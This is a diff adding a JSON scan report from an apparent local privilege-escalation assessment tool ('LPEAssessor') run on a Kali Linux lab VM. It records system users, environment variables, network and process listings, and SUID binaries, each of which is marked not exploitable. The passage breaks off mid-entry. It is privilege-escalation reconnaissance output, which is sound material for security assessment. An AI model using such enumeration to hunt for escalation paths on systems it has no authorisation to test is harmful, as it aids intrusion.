@@ -1,0 +1,1174 @@
+{
+    "scan_time": "2025-03-16 05:33:44",
+    "system_info": {
+        "hostname": "kali",
+        "os": "Linux",
+        "kernel_version": "6.11.2-amd64",
+        "architecture": "x86_64",
+        "current_user": "kali",
+        "user_id": 1000,
+        "group_id": 1000,
+        "groups": [
+            "adm",
+            "dialout",
+            "cdrom",
+            "floppy",
+            "sudo",
+            "audio",
+            "dip",
+            "video",
+            "plugdev",
+            "users",
+            "netdev",
+            "bluetooth",
+            "scanner",
+            "lpadmin",
+            "wireshark",
+            "kaboxer",
+            "vboxsf"
+        ],
+        "system_users": [
+            "root",
+            "daemon",
+            "bin",
+            "sys",
+            "sync",
+            "games",
+            "man",
+            "lp",
+            "mail",
+            "news",
+            "uucp",
+            "proxy",
+            "www-data",
+            "backup",
+            "list",
+            "irc",
+            "_apt",
+            "nobody",
+            "systemd-network",
+            "dhcpcd",
+            "systemd-timesync",
+            "messagebus",
+            "tss",
+            "strongswan",
+            "tcpdump",
+            "sshd",
+            "dnsmasq",
+            "avahi",
+            "nm-openvpn",
+            "speech-dispatcher",
+            "usbmux",
+            "pulse",
+            "nm-openconnect",
+            "lightdm",
+            "saned",
+            "polkitd",
+            "rtkit",
+            "colord",
+            "_galera",
+            "mysql",
+            "stunnel4",
+            "_rpc",
+            "geoclue",
+            "Debian-snmp",
+            "sslh",
+            "ntpsec",
+            "cups-pk-helper",
+            "redsocks",
+            "_gophish",
+            "iodine",
+            "miredo",
+            "statd",
+            "redis",
+            "postgres",
+            "mosquitto",
+            "inetsim",
+            "_gvm",
+            "kali",
+            "test"
+        ],
+        "environment": {
+            "COLORFGBG": "15;0",
+            "COLORTERM": "truecolor",
+            "COMMAND_NOT_FOUND_INSTALL_PROMPT": "1",
+            "DBUS_SESSION_BUS_ADDRESS": "unix:path=/run/user/1000/bus",
+            "DESKTOP_SESSION": "lightdm-xsession",
+            "DISPLAY": ":0.0",
+            "DOTNET_CLI_TELEMETRY_OPTOUT": "1",
+            "GDMSESSION": "lightdm-xsession",
+            "HOME": "/home/kali",
+            "LANG": "en_US.UTF-8",
+            "LANGUAGE": "",
+            "LOGNAME": "kali",
+            "NMAP_PRIVILEGED": "",
+            "PATH": "/home/kali/.local/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/kali/.dotnet/tools",
+            "POWERSHELL_TELEMETRY_OPTOUT": "1",
+            "POWERSHELL_UPDATECHECK": "Off",
+            "PWD": "/home/kali/LPEAssessor",
+            "QT_ACCESSIBILITY": "1",
+            "QT_AUTO_SCREEN_SCALE_FACTOR": "0",
+            "QT_QPA_PLATFORMTHEME": "qt5ct",
+            "SESSION_MANAGER": "local/kali:@/tmp/.ICE-unix/882,unix/kali:/tmp/.ICE-unix/882",
+            "SHELL": "/usr/bin/zsh",
+            "SHLVL": "1",
+            "SSH_AGENT_PID": "1019",
+            "SSH_AUTH_SOCK": "/tmp/ssh-mhPga1oNQAkZ/agent.1018",
+            "TERM": "xterm-256color",
+            "USER": "kali",
+            "WINDOWID": "0",
+            "XAUTHORITY": "/home/kali/.Xauthority",
+            "XDG_CACHE_HOME": "/home/kali/.cache",
+            "XDG_CONFIG_DIRS": "/etc/xdg",
+            "XDG_CONFIG_HOME": "/home/kali/.config",
+            "XDG_CURRENT_DESKTOP": "XFCE",
+            "XDG_DATA_DIRS": "/usr/share/xfce4:/usr/local/share/:/usr/share/:/usr/share",
+            "XDG_GREETER_DATA_DIR": "/var/lib/lightdm/data/kali",
+            "XDG_MENU_PREFIX": "xfce-",
+            "XDG_RUNTIME_DIR": "/run/user/1000",
+            "XDG_SEAT": "seat0",
+            "XDG_SEAT_PATH": "/org/freedesktop/DisplayManager/Seat0",
+            "XDG_SESSION_CLASS": "user",
+            "XDG_SESSION_DESKTOP": "lightdm-xsession",
+            "XDG_SESSION_ID": "2",
+            "XDG_SESSION_PATH": "/org/freedesktop/DisplayManager/Session0",
+            "XDG_SESSION_TYPE": "x11",
+            "XDG_VTNR": "7",
+            "_JAVA_OPTIONS": "-Dawt.useSystemAAFontSettings=on -Dswing.aatext=true",
+            "OLDPWD": "/home/kali/LPEAssessor",
+            "LS_COLORS": "rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=00:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.7z=01;31:*.ace=01;31:*.alz=01;31:*.apk=01;31:*.arc=01;31:*.arj=01;31:*.bz=01;31:*.bz2=01;31:*.cab=01;31:*.cpio=01;31:*.crate=01;31:*.deb=01;31:*.drpm=01;31:*.dwm=01;31:*.dz=01;31:*.ear=01;31:*.egg=01;31:*.esd=01;31:*.gz=01;31:*.jar=01;31:*.lha=01;31:*.lrz=01;31:*.lz=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.lzo=01;31:*.pyz=01;31:*.rar=01;31:*.rpm=01;31:*.rz=01;31:*.sar=01;31:*.swm=01;31:*.t7z=01;31:*.tar=01;31:*.taz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tgz=01;31:*.tlz=01;31:*.txz=01;31:*.tz=01;31:*.tzo=01;31:*.tzst=01;31:*.udeb=01;31:*.war=01;31:*.whl=01;31:*.wim=01;31:*.xz=01;31:*.z=01;31:*.zip=01;31:*.zoo=01;31:*.zst=01;31:*.avif=01;35:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:*~=00;90:*#=00;90:*.bak=00;90:*.crdownload=00;90:*.dpkg-dist=00;90:*.dpkg-new=00;90:*.dpkg-old=00;90:*.dpkg-tmp=00;90:*.old=00;90:*.orig=00;90:*.part=00;90:*.rej=00;90:*.rpmnew=00;90:*.rpmorig=00;90:*.rpmsave=00;90:*.swp=00;90:*.tmp=00;90:*.ucf-dist=00;90:*.ucf-new=00;90:*.ucf-old=00;90::ow=30;44:",
+            "LESS_TERMCAP_mb": "\u001b[1;31m",
+            "LESS_TERMCAP_md": "\u001b[1;36m",
+            "LESS_TERMCAP_me": "\u001b[0m",
+            "LESS_TERMCAP_so": "\u001b[01;33m",
+            "LESS_TERMCAP_se": "\u001b[0m",
+            "LESS_TERMCAP_us": "\u001b[1;32m",
+            "LESS_TERMCAP_ue": "\u001b[0m",
+            "_": "/usr/bin/python3"
+        },
+        "disk_space": "Filesystem      Size  Used Avail Use% Mounted on\nudev            926M     0  926M   0% /dev\ntmpfs           198M  976K  197M   1% /run\n/dev/sda1        79G   16G   60G  21% /\ntmpfs           988M  4.0K  988M   1% /dev/shm\ntmpfs           5.0M     0  5.0M   0% /run/lock\ntmpfs           1.0M     0  1.0M   0% /run/credentials/systemd-journald.service\ntmpfs           1.0M     0  1.0M   0% /run/credentials/systemd-udev-load-credentials.service\ntmpfs           1.0M     0  1.0M   0% /run/credentials/systemd-tmpfiles-setup-dev-early.service\ntmpfs           1.0M     0  1.0M   0% /run/credentials/systemd-sysctl.service\ntmpfs           1.0M     0  1.0M   0% /run/credentials/systemd-tmpfiles-setup-dev.service\ntmpfs           988M  8.0K  988M   1% /tmp\ntmpfs           1.0M     0  1.0M   0% /run/credentials/systemd-tmpfiles-setup.service\ntmpfs           1.0M     0  1.0M   0% /run/credentials/getty@tty1.service\ntmpfs           198M  120K  198M   1% /run/user/1000\n",
+        "network_interfaces": "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host noprefixroute \n       valid_lft forever preferred_lft forever\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000\n    link/ether 08:00:27:6e:13:6e brd ff:ff:ff:ff:ff:ff\n    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0\n       valid_lft 86345sec preferred_lft 86345sec\n    inet6 fe80::26d3:dd05:fe3:e8ce/64 scope link noprefixroute \n       valid_lft forever preferred_lft forever\n",
+        "listening_ports": "Active Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State      \n",
+        "running_processes": "USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot           1  0.9  0.6  22656 13524 ?        Ss   05:28   0:00 /sbin/init splash\nroot           2  0.0  0.0      0     0 ?        S    05:28   0:00 [kthreadd]\nroot           3  0.0  0.0      0     0 ?        S    05:28   0:00 [pool_workqueue_release]\nroot           4  0.0  0.0      0     0 ?        I<   05:28   0:00 [kworker/R-rcu_gp]\nroot           5  0.0  0.0      0     0 ?        I<   05:28   0:00 [kworker/R-sync_wq]\nroot           6  0.0  0.0      0     0 ?        I<   05:28   0:00 [kworker/R-slub_flushwq]\nroot           7  0.0  0.0      0     0 ?        I<   05:28   0:00 [kworker/R-netns]\nroot           8  0.0  0.0      0     0 ?        I    05:28   0:00 [kworker/0:0-events_power_efficient]\nroot           9  0.2  0.0      0     0 ?        I    05:28   0:00 [kworker/0:1-rcu_gp]\nroot          10  0.5  0.0      0     0 ?        I<   05:28   0:00 [kworker/0:0H-kblockd]\nroot          11  0.0  0.0      0     0 ?        I    05:28   0:00 [kworker/u8:0-qrtr_ns_handler]\nroot          12  0.0  0.0      0     0 ?        I<   05:28   0:00 [kworker/R-mm_percpu_wq]\nroot          13  0.0  0.0      0     0 ?        I    05:28   0:00 [rcu_tasks_kthread]\nroot          14  0.0  0.0      0     0 ?        I    05:28   0:00 [rcu_tasks_rude_kthread]\nroot          15  0.0  0.0      0     0 ?        I    05:28   0:00 [rcu_tasks_trace_kthread]\nroot          16  0.0  0.0      0     0 ?        S    05:28   0:00 [ksoftirqd/0]\nroot          17  0.1  0.0      0     0 ?        I    05:28   0:00 [rcu_preempt]\nroot          18  0.0  0.0      0     0 ?        S    05:28   0:00 [rcu_exp_par_gp_kthread_worker/0]\nroot          19  0.0  0.0      0     0 ?        S    05:28   0:00 [rcu_exp_gp_kthread_worker]\nroot          20  0.0  0.0      0     0 ?        S    05:28   0:00 [migration/0]\nroot          21  0.0  0.0      0     0 ?        S    05:28   0:00 [idle_inject/0]\nroot          22  0.0  0.0      0     0 ?        S    05:28   0:00 [cpuhp/0]\nroot          23  0.0  0.0      0     0 ?        S    05:28   0:00 [cpuhp/1]\nroot          24  0.0  0.0      0     0 ?        S    05:28   0:00 [idle_inject/1]\nroot          25  0.2  0.0      0     0 ?        S    05:28   0:00 [migration/1]\nroot          26  0.0  0.0      0     0 ?        S    05:28   0:00 [ksoftirqd/1]\nroot          27  0.0  0.0      0     0 ?        I    05:28   0:00 [kworker/1:0-rcu_gp]\nroot          28  0.0  0.0      0     0 ?        I<   05:28   0:00 [kworker/1:0H-events_highpri]\nroot          29  0.0  0.0      0     0 ?        I    05:28   0:00 [kworker/u9:0-flush-8:0]\nroot          30  0.0  0.0      0     0 ?        I    05:28   0:00 [kworker/u10:0-events_unbound]\nroot          32  0.5  0.0      0     0 ?        I    05:28   0:00 [kworker/u10:1-events_unbound]\nroot          33  0.0  0.0      0     0 ?        S    05:28   0:00 [kdevtmpfs]\nroot          34  0.0  0.0      0     0 ?        I<   05:28   0:00 [kworker/R-inet_frag_wq]\nroot          35  0.0  0.0      0     0 ?        S    05:28   0:00 [kauditd]\nroot          36  0.0  0.0      0     0 ?        I    05:28   0:00 [kworker/u9:1-flush-8:0]\nroot          37  0.0  0.0      0     0 ?        S    05:28   0:00 [khungtaskd]\nroot          38  0.0  0.0      0     0 ?        S    05:28   0:00 [oom_reaper]\nroot          39  0.0  0.0      0     0 ?        I<   05:28   0:00 [kworker/R-writeback]\nroot          40  0.0  0.0      0     0 ?        S    05:28   0:00 [kcompactd0]\nroot          41  0.0  0.0      0     0 ?        SN   05:28   0:00 [ksmd]\nroot          42  0.2  0.0      0     0 ?        SN   05:28   0:00 [khugepaged]\nroot          43  0.0  0.0      0     0 ?        I<   05:28   0:00 [kworker/R-kintegrityd]\nroot          44  0.0  0.0      0     0 ?        I<   05:28   0:00 [kworker/R-kblockd]\nroot          45  0.0  0.0      0     0 ?        I<   05:28   0:00 [kworker/R-blkcg_punt_bio]\nroot          46  0.0  0.0      0     0 ?        S    05:28   0:00 [irq/9-acpi]\nroot          47  0.2  0.0      0     0 ?        I    05:28   0:00 [kworker/1:1-rcu_gp]\nroot          48  0.0  0.0      0     0 ?        I<   05:28   0:00 [kworker/R-tpm_dev_wq]\nroot          49  0.0  0.0      0     0 ?        I<   05:28   0:00 [kworker/R-edac-poller]\nroot          50  0.0  0.0      0     0 ?        I<   05:28   0:00 [kworker/R-devfreq_wq]\nroot          51  0.2  0.0      0     0 ?        I<   05:28   0:00 [kworker/1:1H-kblockd]\nroot          52  0.0  0.0      0     0 ?        S    05:28   0:00 [kswapd0]\nroot          59  0.0  0.0      0     0 ?        I<   05:28   0:00 [kworker/R-kthrotld]\nroot          63  0.0  0.0      0     0 ?        I<   05:28   0:00 [kworker/R-acpi_thermal_pm]\nroot          64  0.1  0.0      0     0 ?        I    05:28   0:00 [kworker/0:2-events_freezable_pwr_efficient]\nroot          65  0.0  0.0      0     0 ?        I<   05:28   0:00 [kworker/R-mld]\nroot          66  0.0  0.0      0     0 ?        I<   05:28   0:00 [kworker/0:1H-kblockd]\nroot          67  0.0  0.0      0     0 ?        I<   05:28   0:00 [kworker/R-ipv6_addrconf]\nroot          69  0.0  0.0      0     0 ?        I    05:28   0:00 [kworker/u8:1-netns]\nroot          73  0.0  0.0      0     0 ?        I<   05:28   0:00 [kworker/R-kstrp]\nroot          77  0.0  0.0      0     0 ?        I<   05:28   0:00 [kworker/u11:0]\nroot          78  0.0  0.0      0     0 ?        I<   05:28   0:00 [kworker/u12:0-ttm]\nroot          79  0.0  0.0      0     0 ?        I<   05:28   0:00 [kworker/u13:0]\nroot          84  0.0  0.0      0     0 ?        I<   05:28   0:00 [kworker/R-cryptd]\nroot          85  0.0  0.0      0     0 ?        I    05:28   0:00 [kworker/1:2-events]\nroot          90  0.0  0.0      0     0 ?        I    05:28   0:00 [kworker/u9:2-flush-8:0]\nroot         214  0.0  0.0      0     0 ?        I<   05:28   0:00 [kworker/R-ata_sff]\nroot         215  0.0  0.0      0     0 ?        S    05:28   0:00 [scsi_eh_0]\nroot         216  0.0  0.0      0     0 ?        S    05:28   0:00 [scsi_eh_1]\nroot         217  0.0  0.0      0     0 ?        I<   05:28   0:00 [kworker/R-scsi_tmf_1]\nroot         218  0.0  0.0      0     0 ?        I    05:28   0:00 [kworker/u10:2-flush-8:0]\nroot         219  0.0  0.0      0     0 ?        I<   05:28   0:00 [kworker/R-scsi_tmf_0]\nroot         220  0.0  0.0      0     0 ?        S    05:28   0:00 [scsi_eh_2]\nroot         221  0.0  0.0      0     0 ?        I<   05:28   0:00 [kworker/R-scsi_tmf_2]\nroot         222  0.0  0.0      0     0 ?        I    05:28   0:00 [kworker/u9:3-flush-8:0]\nroot         223  0.0  0.0      0     0 ?        I    05:28   0:00 [kworker/1:3-events]\nroot         234  0.0  0.0      0     0 ?        S    05:28   0:00 [irq/18-vmwgfx]\nroot         236  0.0  0.0      0     0 ?        I<   05:28   0:00 [kworker/R-ttm]\nroot         242  0.1  0.0      0     0 ?        I    05:28   0:00 [kworker/0:3-events_freezable_pwr_efficient]\nroot         243  0.0  0.0      0     0 ?        I<   05:28   0:00 [kworker/0:2H]\nroot         281  0.0  0.0      0     0 ?        S    05:28   0:00 [jbd2/sda1-8]\nroot         282  0.0  0.0      0     0 ?        I<   05:28   0:00 [kworker/R-ext4-rsv-conversion]\nroot         344  0.2  0.8  41816 17220 ?        Ss   05:28   0:00 /usr/lib/systemd/systemd-journald\nroot         385  0.1  0.4  29988  8132 ?        Ss   05:28   0:00 /usr/lib/systemd/systemd-udevd\nroot         387  0.0  0.0      0     0 ?        I    05:28   0:00 [kworker/u10:3-writeback]\nroot         393  0.0  0.0      0     0 ?        S    05:28   0:00 [psimon]\nroot         500  0.2  0.3   8368  6512 ?        Ss   05:28   0:00 /usr/sbin/haveged --Foreground --verbose=1\nroot         516  0.0  0.3 308632  7212 ?        Ssl  05:28   0:00 /usr/libexec/accounts-daemon\nmessage+     517  0.3  0.2   8588  5632 ?        Ss   05:28   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only\npolkitd      519  0.2  0.4 382096  9968 ?        Ssl  05:28   0:00 /usr/lib/polkit-1/polkitd --no-debug --log-level=err\nroot         520  0.0  0.0      0     0 ?        I<   05:28   0:00 [kworker/R-rpciod]\nroot         521  0.0  0.0      0     0 ?        I<   05:28   0:00 [kworker/R-xprtiod]\nroot         522  0.1  0.4  17944  8632 ?        Ss   05:28   0:00 /usr/lib/systemd/systemd-logind\nroot         537  0.0  0.1   6772  2664 ?        Ss   05:28   0:00 /usr/sbin/cron -f\nroot         572  0.1  0.9 333696 18648 ?        Ssl  05:28   0:00 /usr/sbin/NetworkManager --no-daemon\nroot         600  0.1  0.5 389980 11804 ?        Ssl  05:28   0:00 /usr/sbin/ModemManager\nroot         628  0.0  0.1 290548  2972 ?        Sl   05:28   0:00 /usr/sbin/VBoxService\nroot         648  0.0  0.0      0     0 ?        I    05:28   0:00 [kworker/u8:2]\nroot         694  0.0  0.3 380936  7148 ?        SLsl 05:28   0:00 /usr/sbin/lightdm\nroot         706  6.8  6.2 422096 125856 tty7    Ssl+ 05:28   0:03 /usr/lib/xorg/Xorg :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch\nroot         707  0.0  0.0   6996  1884 tty1     Ss+  05:28   0:00 /sbin/agetty -o -p -- \\u --noclear - linux\nroot         719  0.0  0.0      0     0 ?        I    05:28   0:00 [kworker/1:4]\nroot         734  0.0  0.0      0     0 ?        S    05:28   0:00 [psimon]\nrtkit        760  0.0  0.1  20332  2732 ?        SNsl 05:28   0:00 /usr/libexec/rtkit-daemon\nroot         831  0.0  0.5 237004 10140 ?        Sl   05:28   0:00 lightdm --session-child 13 24\nkali         839  0.1  0.5  21352 12024 ?        Ss   05:28   0:00 /usr/lib/systemd/systemd --user\nkali         840  0.0  0.1  22632  3532 ?        S    05:28   0:00 (sd-pam)\nkali         857  0.0  0.7 109604 14188 ?        S<sl 05:28   0:00 /usr/bin/pipewire\nkali         859  0.0  0.2  84336  5236 ?        Ssl  05:28   0:00 /usr/bin/pipewire -c filter-chain.conf\nkali         860  0.1  1.6 643608 34028 ?        S<sl 05:28   0:00 /usr/bin/wireplumber\nkali         862  0.0  0.4  98740  8804 ?        S<sl 05:28   0:00 /usr/bin/pipewire-pulse\nkali         863  0.0  0.4 313832  9664 ?        SLsl 05:28   0:00 /usr/bin/gnome-keyring-daemon --foreground --components=pkcs11,secrets --control-directory=/run/user/1000/keyring\nkali         864  0.2  0.2   7740  5388 ?        Ss   05:28   0:00 /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only\nkali         882  0.2  1.1 337132 23884 ?        Ssl  05:28   0:00 xfce4-session\nkali         946  0.0  0.0  17260  1644 ?        S    05:28   0:00 /usr/bin/VBoxClient --clipboard\nkali         948  0.0  0.1 215448  3976 ?        Sl   05:28   0:00 /usr/bin/VBoxClient --clipboard\nkali         961  0.0  0.0  17260  1808 ?        S    05:28   0:00 /usr/bin/VBoxClient --seamless\nkali         962  0.1  0.1 215548  3204 ?        Sl   05:28   0:00 /usr/bin/VBoxClient --seamless\nkali         969  0.0  0.0  17260  1704 ?        S    05:28   0:00 /usr/bin/VBoxClient --draganddrop\nkali         970  0.3  0.1 216064  3244 ?        Sl   05:28   0:00 /usr/bin/VBoxClient --draganddrop\nkali         993  0.0  0.3 380912  7628 ?        Ssl  05:28   0:00 /usr/libexec/at-spi-bus-launcher\nkali        1000  0.0  0.2   7352  4776 ?        S    05:28   0:00 /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 11 --address=unix:path=/run/user/1000/at-spi/bus_0\nkali        1005  0.1  0.3 307504  6440 ?        Sl   05:28   0:00 /usr/lib/x86_64-linux-gnu/xfce4/xfconf/xfconfd\nkali        1011  0.0  0.3 234048  7728 ?        Sl   05:28   0:00 /usr/libexec/at-spi2-registryd --use-gnome-session\nkali        1019  0.0  0.0   9916  1388 ?        Ss   05:28   0:00 /usr/bin/ssh-agent -s\nkali        1027  0.0  0.1  81676  3600 ?        SLs  05:28   0:00 /usr/bin/gpg-agent --supervised\nkali        1029  1.4  6.2 983212 126056 ?       Sl   05:28   0:00 xfwm4\nkali        1033  0.0  0.3 312480  7884 ?        Ssl  05:28   0:00 /usr/libexec/gvfsd\nkali        1039  0.0  0.3 457552  7068 ?        Sl   05:28   0:00 /usr/libexec/gvfsd-fuse /run/user/1000/gvfs -f\nkali        1055  0.2  1.3 301748 27448 ?        Sl   05:28   0:00 xfsettingsd\nkali        1063  0.0  0.0  17260  1656 ?        S    05:28   0:00 /usr/bin/VBoxClient --vmsvga\nkali        1064  0.0  0.1 215652  3580 ?        Sl   05:28   0:00 /usr/bin/VBoxClient --vmsvga\nroot        1068  0.0  0.0      0     0 ?        I<   05:28   0:00 [kworker/u12:1]\nkali        1069  0.4  2.1 535540 42592 ?        Sl   05:28   0:00 xfce4-panel\nkali        1074  1.0  2.4 467248 48680 ?        Sl   05:28   0:00 Thunar --daemon\nkali        1079  1.4  3.1 558880 64588 ?        Sl   05:28   0:00 xfdesktop\nkali        1083  0.4  2.1 460376 42712 ?        Sl   05:28   0:00 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libwhiskermenu.so 1 27262983 whiskermenu Whisker Menu Show a menu to easily access installed applications\nkali        1087  0.8  2.2 286364 44528 ?        Sl   05:28   0:00 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libcpugraph.so 13 27262988 cpugraph CPU Graph Graphical representation of the CPU load\nkali        1088  0.1  1.2 409820 24408 ?        Sl   05:28   0:00 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libsystray.so 14 27262989 systray Status Tray Plugin Provides status notifier items (application indicators) and legacy systray items\nkali        1089  0.9  1.3 338100 27992 ?        Sl   05:28   0:00 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libgenmon.so 15 27262990 genmon Generic Monitor Show output of a command.\nkali        1090  0.1  2.0 459232 41832 ?        Sl   05:28   0:00 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libpulseaudio-plugin.so 16 27262991 pulseaudio PulseAudio Plugin Adjust the audio volume of the PulseAudio sound system\nkali        1091  0.1  1.9 459096 38608 ?        Sl   05:28   0:00 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libnotification-plugin.so 17 27262992 notification-plugin Notification Plugin Notification plugin for the Xfce panel\nkali        1092  0.1  1.9 385936 39856 ?        Sl   05:28   0:00 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libxfce4powermanager.so 18 27262993 power-manager-plugin Power Manager Plugin Display the battery levels of your devices and control the brightness of your display\nkali        1100  0.1  1.9 385768 39252 ?        Sl   05:28   0:00 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libactions.so 22 27262994 actions Action Buttons Log out, lock or other system actions\nkali        1132  0.0  0.9 406772 19380 ?        Ssl  05:28   0:00 /usr/lib/x86_64-linux-gnu/xfce4/notifyd/xfce4-notifyd\nroot        1133  0.1  0.4 317492  9804 ?        Ssl  05:28   0:00 /usr/libexec/upowerd\nkali        1149  0.0  0.8 256228 16284 ?        Sl   05:28   0:00 /usr/libexec/polkit-mate-authentication-agent-1\nkali        1151  0.0  0.4 922648  9092 ?        Sl   05:28   0:00 xiccd\nkali        1152  0.2  1.1 262380 23976 ?        Sl   05:28   0:00 xfce4-power-manager\ncolord      1158  0.1  0.6 315620 14100 ?        Ssl  05:28   0:00 /usr/libexec/colord\nkali        1159  0.4  1.9  64044 39512 ?        S    05:28   0:00 /usr/bin/python3 /usr/share/system-config-printer/applet.py\nkali        1169  0.1  1.1 335480 23388 ?        Sl   05:28   0:00 light-locker\nkali        1177  0.0  0.2 230560  5676 ?        Ssl  05:28   0:00 /usr/libexec/dconf-service\nkali        1183  0.7  2.8 526856 58336 ?        Sl   05:28   0:00 /usr/bin/python3 /usr/bin/blueman-applet\nkali        1189  0.3  1.3 575856 28264 ?        SNsl 05:28   0:00 /usr/lib/x86_64-linux-gnu/tumbler-1/tumblerd\nkali        1191  0.0  0.3 308172  6624 ?        Sl   05:28   0:00 /usr/libexec/geoclue-2.0/demos/agent\nkali        1216  0.2  2.2 621724 45740 ?        Sl   05:28   0:00 nm-applet\nroot        1236  0.0  0.3 322464  7444 ?        Ssl  05:28   0:00 /usr/sbin/pcscd --foreground --auto-exit\nkali        1250  0.0  0.6 425900 12964 ?        Ssl  05:28   0:00 /usr/libexec/gvfs-udisks2-volume-monitor\nroot        1258  0.0  0.6 469108 13440 ?        Ssl  05:28   0:00 /usr/libexec/udisks2/udisksd\nkali        1309  0.0  0.3 308664  7052 ?        Ssl  05:28   0:00 /usr/libexec/gvfs-gphoto2-volume-monitor\nkali        1314  0.0  0.4 389044  8448 ?        Ssl  05:28   0:00 /usr/libexec/gvfs-afc-volume-monitor\nkali        1320  0.0  0.3 307612  6392 ?        Ssl  05:28   0:00 /usr/libexec/gvfs-goa-volume-monitor\nkali        1325  0.0  0.3 307708  6468 ?        Ssl  05:28   0:00 /usr/libexec/gvfs-mtp-volume-monitor\nkali        1338  0.0  0.4 533952  8944 ?        Sl   05:28   0:00 /usr/libexec/gvfsd-trash --spawner :1.22 /org/gtk/gvfs/exec_spaw/0\nkali        1348  0.0  0.3 234188  6380 ?        Ssl  05:28   0:00 /usr/libexec/gvfsd-metadata\nkali        1353  0.0  0.3  46384  7376 ?        Ss   05:28   0:00 /usr/libexec/bluetooth/obexd\nroot        1372  0.0  0.0      0     0 ?        I    05:28   0:00 [kworker/u9:4-events_unbound]\nroot        1435  0.0  0.0      0     0 ?        I    05:28   0:00 [kworker/u10:4-flush-8:0]\nkali        1494  1.0  5.0 462444 102504 ?       Sl   05:28   0:00 /usr/bin/qterminal\nkali        1497  0.2  0.3  10284  6280 pts/0    Ss   05:28   0:00 /usr/bin/zsh\nroot        1535  0.0  0.0      0     0 ?        I<   05:29   0:00 [kworker/1:2H]\nkali        1724 54.5  1.1  30428 22744 pts/0    S+   05:29   0:00 python3 LPEAssessor.py -o report01 -f json\nkali        1730  0.0  0.1   8388  3868 pts/0    R+   05:29   0:00 ps aux\n"
+    },
+    "vulnerabilities": [
+        {
+            "type": "suid_binary",
+            "path": "/etc/alternatives/rsh",
+            "owner": "root",
+            "group": "root",
+            "permissions": "4755",
+            "exploit_method": "",
+            "is_exploitable": false
+        },
+        {
+            "type": "suid_binary",
+            "path": "/etc/alternatives/rlogin",
+            "owner": "root",
+            "group": "root",
+            "permissions": "4755",
+            "exploit_method": "",
+            "is_exploitable": false
+        },
+        {
+            "type": "suid_binary",
+            "path": "/usr/lib/chromium/chrome-sandbox",
+            "owner": "root",
+            "group": "root",
+            "permissions": "4755",
+            "exploit_method": "",
+            "is_exploitable": false
+        },
+        {
+            "type": "suid_binary",
+            "path": "/usr/lib/openssh/ssh-keysign",
+            "owner": "root",
+            "group": "root",
+            "permissions": "4755",
+            "exploit_method": "",
+            "is_exploitable": false
+        },
+        {
+            "type": "suid_binary",
+            "path": "/usr/lib/polkit-1/polkit-agent-helper-1",
+            "owner": "root",
+            "group": "root",
+            "permissions": "4755",
+            "exploit_method": "",
+            "is_exploitable": false
+        },
+        {
+            "type": "suid_binary",
+            "path": "/usr/lib/policykit-1/polkit-agent-helper-1",
+            "owner": "root",
+            "group": "root",
+            "permissions": "4755",
+            "exploit_method": "",
+            "is_exploitable": false
+        },
+        {
+            "type": "suid_binary",
